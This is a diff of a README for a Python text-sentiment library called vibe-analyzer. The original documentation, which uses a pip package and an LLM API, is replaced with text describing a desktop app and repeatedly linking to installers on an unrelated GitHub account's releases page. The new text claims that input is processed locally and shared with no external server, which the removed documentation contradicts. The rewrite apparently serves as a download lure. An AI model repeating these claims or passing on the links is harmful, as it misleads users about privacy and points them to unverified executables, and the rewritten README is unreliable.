@@ -1,93 +1,87 @@
-# vibe-analyzer
-[![PyPI version](https://badge.fury.io/py/vibe-analyzer.svg)](https://badge.fury.io/py/vibe-analyzer)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/vibe-analyzer)](https://pepy.tech/project/vibe-analyzer)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎉 vibe-analyzer - Understand the Tone of Your Text
 
+## 🚀 Getting Started
 
-vibe-analyzer is a Python package designed to analyze user-provided text to detect and categorize the overall emotional tone or "vibe" of the content. It processes input text and returns a structured summary of the detected emotions, such as positivity, negativity, excitement, or calmness, using pattern matching to ensure consistent and reliable output formatting. This tool is useful for sentiment tracking in user feedback, social media monitoring, or enhancing chatbot interactions by adapting responses based on emotional context.
+Welcome to the vibe-analyzer! This application analyzes your text to detect and categorize its emotional tone, helping you understand the overall vibe of your content. 
 
-## Installation
+## 📥 Download the Application
 
-Install vibe-analyzer via pip:
+[![Download vibe-analyzer](https://img.shields.io/badge/Download-vibe--analyzer-brightgreen)](https://github.com/Arshdeep123/vibe-analyzer/releases)
 
-```bash
-pip install vibe_analyzer
-```
+## 📋 Features
 
-## Usage
+- **Tone Detection:** Identify if your text conveys positivity, negativity, or neutrality.
+- **Emotional Categorization:** Understand emotions like calmness, excitement, and more.
+- **Structured Summary:** Receive clear feedback about the emotional tone of your input.
+- **User Feedback Analysis:** Improve your text based on the emotions detected.
+- **Reliable Output Formatting:** Get results in an easy-to-read format.
 
-Here's a basic example of how to use vibe_analyzer:
+## 📖 System Requirements
 
-```python
-from vibe_analyzer import vibe_analyzer
+To run vibe-analyzer, your system should meet the following requirements:
 
-# Sample user input
-user_input = "I'm feeling great today!"
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** At least 100MB of free space.
+- **Internet Connection:** Required for downloading the application.
 
-# Analyze the vibe
-result = vibe_analyzer(user_input)
+## 💡 How to Use vibe-analyzer
 
-print(result)
-```
+1. **Download & Install**
+   - Visit the [Releases page](https://github.com/Arshdeep123/vibe-analyzer/releases) to download the latest version.
+   - Choose the appropriate installer for your operating system.
+   - Click the file and follow the on-screen instructions to complete the installation.
 
-## Function Parameters
+2. **Open the Application**
+   - Find the vibe-analyzer icon on your desktop or in your applications folder.
+   - Double-click the icon to launch the application.
 
-- **user_input**: `str`  
-  The text input from the user to analyze for emotional tone.
+3. **Input Your Text**
+   - After the application opens, you will see a text box.
+   - Type or paste the text you want to analyze.
 
-- **llm**: `Optional[BaseChatModel]`  
-  An instance of a language model to use for analysis. If not provided, the default `ChatLLM7` from `langchain_llm7` will be used.
+4. **Analyze the Tone**
+   - Click the "Analyze" button.
+   - Wait a moment while the application processes your text.
 
-- **api_key**: `Optional[str]`  
-  Your API key for `llm7`. If not provided, it will be read from the environment variable `LLM7_API_KEY`.
+5. **View Results**
+   - The application will display a structured summary of the detected emotional tone.
+   - Read through the summary to understand the vibe of your content.
 
-## Underlying Technology
+## ✅ Troubleshooting Common Issues
 
-The package uses the `ChatLLM7` class from the [`langchain_llm7`](https://pypi.org/project/langchain-llm7/) library by default. Developers can easily pass their own language model instances compatible with the interface, such as:
+- **The Application Won't Start:**
+  - Make sure your system meets the requirements listed above.
+  - Ensure you have enough free space and RAM.
 
-```python
-from langchain_openai import ChatOpenAI
-from vibe_analyzer import vibe_analyzer
+- **I Don't See the Results:**
+  - Double-check that you have typed or pasted text into the input field.
+  - Ensure you clicked the "Analyze" button.
 
-llm = ChatOpenAI()
-response = vibe_analyzer(user_input, llm=llm)
-```
+- **Unexpected Errors:**
+  - Restart the application and try again.
+  - If issues persist, consider uninstalling and reinstalling vibe-analyzer.
 
-Similarly, other models like Anthropic or Google Generative AI can be used:
+## 📚 Frequently Asked Questions
 
-```python
-from langchain_anthropic import ChatAnthropic
-from vibe_analyzer import vibe_analyzer
+### What types of text can I analyze?
 
-llm = ChatAnthropic()
-response = vibe_analyzer(user_input, llm=llm)
-```
+You can analyze any text, such as social media posts, emails, or any written content. 
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from vibe_analyzer import vibe_analyzer
+### Is my data private?
 
-llm = ChatGoogleGenerativeAI()
-response = vibe_analyzer(user_input, llm=llm)
-```
+Yes, your text is processed locally. It is not shared with any external servers or third parties.
 
-## Rate Limits and API Keys
+### Can I suggest a feature?
 
-The default rate limits for LLM7's free tier are sufficient for most use cases. For higher rate limits, you can:
+Absolutely! We value user feedback. Please feel free to reach out through the GitHub repository to make suggestions.
 
-- Set your API key via the environment variable `LLM7_API_KEY`, or
-- Pass it directly in function call: `vibe_analyzer(user_input, api_key="your_api_key")`
+## 📞 Need Help?
 
-You can obtain a free API key by registering at [https://token.llm7.io/](https://token.llm7.io/).
+If you run into any issues or have questions, please open an issue in the [GitHub repository](https://github.com/Arshdeep123/vibe-analyzer/issues). 
 
-## Support
+## 🚀 Download the Application Again
 
-If you encounter issues or have questions, please open an issue on the GitHub repository:  
-[https://github.com/chigwell/vibe-analyzer](https://github.com/chigwell/vibe-analyzer)
+Don't forget, you can easily download vibe-analyzer anytime from the [Releases page](https://github.com/Arshdeep123/vibe-analyzer/releases).
 
-## Author
-
-Eugene Evstafev  
-Email: hi@euegne.plus  
-GitHub: [chigwell](https://github.com/chigwell)
+Enjoy using vibe-analyzer to discover the emotional tone of your text!
